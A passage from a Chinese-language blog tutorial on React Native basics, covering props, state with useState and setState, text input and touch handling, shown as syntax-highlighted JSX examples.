class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default class Cafe extends Component &#123;</span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return (</span></span><br><span class="line"><span class="regexp">      &lt;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Cat name="Munkustrap" /</span>&gt;</span><br><span class="line">        &lt;Cat name=<span class="string">"Spot"</span> /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="props"><a href="#props" class="headerlink" title="props"></a>props</h3><p><strong>类似于vue的父子组件传值</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text, View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;View&gt;</span><br><span class="line">      &lt;Text&gt;Hello, I am &#123;props.name&#125;!&lt;/Text&gt;</span><br><span class="line">    &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default function Cafe() &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;View&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Cat name="Maru" /</span>&gt;</span><br><span class="line">      &lt;Cat name=<span class="string">"Jellylorum"</span> /&gt;</span><br><span class="line">      &lt;Cat name=<span class="string">"Spot"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p><strong>类似于vue data对象</strong></p><p><code>useState</code>：</p><p><code>[&lt;getter&gt;, &lt;setter&gt;] = useState(&lt;initialValue&gt;)</code>。</p><p>在函数组件中调用<code>useState</code>，就会创建一个单独的状态。</p><p>在类组件中，<code>state</code> 总是一个对象，可以在该对象上添加保存属性。</p><p>每次调用<code>useState</code>都会创建一个<code>state</code>块，其中包含一个值。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Button, Text, View &#125; <span class="keyword">from</span> <span class="string">"react-native"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建一个状态，并将其初始化为“true”</span></span><br><span class="line">  <span class="keyword">const</span> [isHungry, setIsHungry] = useState(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;View&gt;</span><br><span class="line">      &lt;Text&gt;</span><br><span class="line">        I am &#123;props.name&#125;, and I am &#123;isHungry ? <span class="string">"hungry"</span> : <span class="string">"full"</span>&#125;!</span><br><span class="line">      &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Button</span></span><br><span class="line"><span class="regexp">        onPress=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">          setIsHungry(false);</span></span><br><span class="line"><span class="regexp">        &#125;&#125;</span></span><br><span class="line"><span class="regexp">        disabled=&#123;!isHungry&#125;</span></span><br><span class="line"><span class="regexp">        title=&#123;isHungry ? "Pour me some milk, please!" : "Thank you!"&#125;</span></span><br><span class="line"><span class="regexp">      /</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default function Cafe() &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Cat name="Munkustrap" /</span>&gt;</span><br><span class="line">      &lt;Cat name=<span class="string">"Spot"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Button, Text, View &#125; <span class="keyword">from</span> <span class="string">"react-native"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 声明状态</span></span><br><span class="line">  state = &#123; <span class="attr">isHungry</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">  render(props) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View&gt;</span><br><span class="line">        &lt;Text&gt;</span><br><span class="line">          I am &#123;<span class="keyword">this</span>.props.name&#125;, and I am</span><br><span class="line">          &#123;<span class="keyword">this</span>.state.isHungry ? <span class="string">" hungry"</span> : <span class="string">" full"</span>&#125;!</span><br><span class="line">        &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Button</span></span><br><span class="line"><span class="regexp">          onPress=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">            &#123;/</span>* 通过 setState 改变状态 *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class="line"><span class="regexp">          &#125;&#125;</span></span><br><span class="line"><span class="regexp">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class="line"><span class="regexp">          title=&#123;</span></span><br><span class="line"><span class="regexp">            this.state.isHungry ? "Pour me some milk, please!" : "Thank you!"</span></span><br><span class="line"><span class="regexp">          &#125;</span></span><br><span class="line"><span class="regexp">        /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default class Cafe extends Component &#123;</span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return (</span></span><br><span class="line"><span class="regexp">      &lt;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Cat name="Munkustrap" /</span>&gt;</span><br><span class="line">        &lt;Cat name=<span class="string">"Spot"</span> /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RN的Props"><a href="#RN的Props" class="headerlink" title="RN的Props"></a>RN的Props</h2><h3 id="原生组件的props"><a href="#原生组件的props" class="headerlink" title="原生组件的props"></a>原生组件的props</h3><p>以常见的基础组件<code>Image</code>为例，在创建一个图片时，可以传入一个名为<code>source</code>的 prop 来指定要显示的图片的地址，以及使用名为<code>style</code>的 prop 来控制其尺寸。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Image &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Bananas</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">let</span> pic = &#123;</span><br><span class="line">      uri: <span class="string">'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Image source=&#123;pic&#125; style=&#123;&#123;<span class="attr">width</span>: <span class="number">193</span>, <span class="attr">height</span>: <span class="number">110</span>&#125;&#125; /&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义组件-1"><a href="#自定义组件-1" class="headerlink" title="自定义组件"></a>自定义组件</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text, View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeting</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;&#123;<span class="attr">alignItems</span>: <span class="string">'center'</span>, <span class="attr">marginTop</span>: <span class="number">50</span>&#125;&#125;&gt;</span><br><span class="line">        &#123;<span class="comment">/* Greeting组件中将name作为一个属性来定制 */</span>&#125;</span><br><span class="line">        &lt;Text&gt;Hello &#123;<span class="keyword">this</span>.props.name&#125;!&lt;/Text&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default class LotsOfGreetings extends Component &#123;</span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return (</span></span><br><span class="line"><span class="regexp">      &lt;View style=&#123;&#123;alignItems: 'center'&#125;&#125;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Greeting name='Rexxar' /</span>&gt;</span><br><span class="line">        &lt;Greeting name=<span class="string">'Jaina'</span> /&gt;</span><br><span class="line">        &lt;Greeting name=<span class="string">'Valeera'</span> /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RN中的State"><a href="#RN中的State" class="headerlink" title="RN中的State"></a>RN中的State</h2><p>一般来说，你需要在class中声明一个<code>state</code>对象，然后在需要修改时调用<code>setState</code>方法。</p><p>假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个<code>prop</code>。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到<code>state</code>中。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Text, View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blink</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 声明state对象</span></span><br><span class="line">  state = &#123; <span class="attr">isShowingText</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="comment">// 每1000毫秒对showText状态做一次取反操作</span></span><br><span class="line">    setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        isShowingText: !<span class="keyword">this</span>.state.isShowingText</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="comment">// 根据当前showText的值决定是否显示text内容</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.state.isShowingText) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Text&gt;&#123;<span class="keyword">this</span>.props.text&#125;&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default class BlinkApp extends Component &#123;</span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return (</span></span><br><span class="line"><span class="regexp">      &lt;View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Blink text='I love to blink' /</span>&gt;</span><br><span class="line">        &lt;Blink text=<span class="string">'Yes blinking is so great'</span> /&gt;</span><br><span class="line">        &lt;Blink text=<span class="string">'Why did they ever take this out of HTML'</span> /&gt;</span><br><span class="line">        &lt;Blink text=<span class="string">'Look at me look at me look at me'</span> /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如<a href="http://redux.js.org/index.html" target="_blank" rel="noopener">Redux</a>来统一管理数据流。</p><ul><li>一切界面变化都是<code>状态state变化</code></li><li><code>state</code>的修改必须通过<code>setState()</code>方法<ul><li>this.state.likes = 100; // 这样的<code>直接赋值修改无效！</code></li><li>setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性</li><li>setState 是<code>异步</code>操作，修改<code>不会马上生效</code></li></ul></li></ul><h2 id="处理文本输入"><a href="#处理文本输入" class="headerlink" title="处理文本输入"></a>处理文本输入</h2><p><a href="https://reactnative.cn/docs/textinput#content" target="_blank" rel="noopener"><code>TextInput</code></a>是一个允许用户输入文本的基础组件。</p><p>它有一个名为<code>onChangeText</code>的属性，此属性接受一个函数，而此函数会在文本变化时被调用。</p><p>另外还有一个名为<code>onSubmitEditing</code>的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/** 处理文本输入</span></span><br><span class="line"><span class="comment"> 每输入一个单词就得到一块 🍕 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PizzaTranslator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [text, setText] = useState(<span class="string">''</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;View style=&#123;&#123;<span class="attr">padding</span>: <span class="number">10</span>&#125;&#125;&gt;</span><br><span class="line">      &lt;TextInput</span><br><span class="line">        style=&#123;&#123;<span class="attr">height</span>: <span class="number">40</span>, <span class="attr">backgroundColor</span>: <span class="string">'#ccc'</span>&#125;&#125;</span><br><span class="line">        placeholder=<span class="string">"Type here to translate!"</span></span><br><span class="line">        onChangeText=&#123;text =&gt; setText(text)&#125;</span><br><span class="line">        defaultValue=&#123;text&#125;</span><br><span class="line">      /&gt;</span><br><span class="line">      &lt;Text style=&#123;&#123;<span class="attr">padding</span>: <span class="number">10</span>, <span class="attr">fontSize</span>: <span class="number">42</span>&#125;&#125;&gt;</span><br><span class="line">        &#123;text.split(<span class="string">' '</span>).map(<span class="function">(<span class="params">word</span>) =&gt;</span> word &amp;&amp; <span class="string">'🍕'</span>).join(<span class="string">' '</span>)&#125;</span><br><span class="line">      &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>View&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200327083821128.png" alt="image-20200327083821128" style="zoom:50%;"></p><h2 id="处理触摸事件"><a href="#处理触摸事件" class="headerlink" title="处理触摸事件"></a>处理触摸事件</h2><h3 id="onPress-事件"><a href="#onPress-事件" class="headerlink" title="onPress 事件"></a>onPress 事件</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button</span><br><span class="line">  onPress=&#123;() =&gt; &#123;</span><br><span class="line">    Alert.alert(<span class="string">"你点击了按钮！"</span>);</span><br><span class="line">  &#125;&#125;</span><br><span class="line">  title=<span class="string">"点我！"</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200327084507790.png" alt="image-20200327084507790" style="zoom:50%;"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  _onPressButton() &#123;</span><br><span class="line">    Alert.alert(<span class="string">'You tapped the button!'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> styles = StyleSheet.create(&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        flex: <span class="number">1</span>,</span><br><span class="line">        justifyContent: <span class="string">'center'</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      buttonContainer: &#123;</span><br><span class="line">        margin: <span class="number">20</span></span><br><span class="line">      &#125;,</span><br><span class="line">      alternativeLayoutButtonContainer: &#123;</span><br><span class="line">        margin: <span class="number">20</span>,</span><br><span class="line">        flexDirection: <span class="string">'row'</span>,</span><br><span class="line">        justifyContent: <span class="string">'space-between'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span><br><span class="line">          &lt;Button</span><br><span class="line">            onPress=&#123;<span class="keyword">this</span>._onPressButton&#125;</span><br><span class="line">            title=<span class="string">"Press Me"</span></span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span></span><br><span class="line"><span class="regexp">          &lt;Button</span></span><br><span class="line"><span class="regexp">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class="line"><span class="regexp">            title="Press Me"</span></span><br><span class="line"><span class="regexp">            color="#841584"</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">        &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">        &lt;View style=&#123;styles.alternativeLayoutButtonContainer&#125;&gt;</span></span><br><span class="line"><span class="regexp">          &lt;Button</span></span><br><span class="line"><span class="regexp">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class="line"><span class="regexp">            title="This looks great!"</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">          &lt;Button</span><br><span class="line">            onPress=&#123;<span class="keyword">this</span>._onPressButton&#125;</span><br><span class="line">            title=<span class="string">"OK!"</span></span><br><span class="line">            color=<span class="string">"#841584"</span></span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>View&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200327085101363.png" alt="image-20200327085101363" style="zoom:50%;"></p><h3 id="Touchable-系列组件"><a href="#Touchable-系列组件" class="headerlink" title="Touchable 系列组件"></a>Touchable 系列组件</h3><ul><li>一般来说，你可以使用<a href="https://reactnative.cn/docs/touchablehighlight" target="_blank" rel="noopener"><strong>TouchableHighlight</strong></a>来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。</li><li>在 Android 上还可以使用<a href="https://reactnative.cn/docs/touchablenativefeedback" target="_blank" rel="noopener"><strong>TouchableNativeFeedback</strong></a>，它会在用户手指按下时形成类似墨水涟漪的视觉效果。</li><li><a href="https://reactnative.cn/docs/touchableopacity" target="_blank" rel="noopener"><strong>TouchableOpacity</strong></a>会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。</li><li>如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用<a href="https://reactnative.cn/docs/touchablewithoutfeedback" target="_blank" rel="noopener"><strong>TouchableWithoutFeedback</strong></a>。</li></ul><ul><li>检测用户是否进行了长按，组件中使用<code>onLongPress</code>属性来实现。</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  _onPressButton() &#123;</span><br><span class="line">    Alert.alert(<span class="string">'You tapped the button!'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _onLongPressButton() &#123;</span><br><span class="line">    Alert.alert(<span class="string">'You long-pressed the button!'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> styles = StyleSheet.create(&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        paddingTop: <span class="number">60</span>,</span><br><span class="line">        alignItems: <span class="string">'center'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      button: &#123;</span><br><span class="line">        marginBottom: <span class="number">30</span>,</span><br><span class="line">        width: <span class="number">260</span>,</span><br><span class="line">        alignItems: <span class="string">'center'</span>,</span><br><span class="line">        backgroundColor: <span class="string">'#2196F3'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      buttonText: &#123;</span><br><span class="line">        textAlign: <span class="string">'center'</span>,</span><br><span class="line">        padding: <span class="number">20</span>,</span><br><span class="line">        fontSize: <span class="number">16</span>,</span><br><span class="line">        color: <span 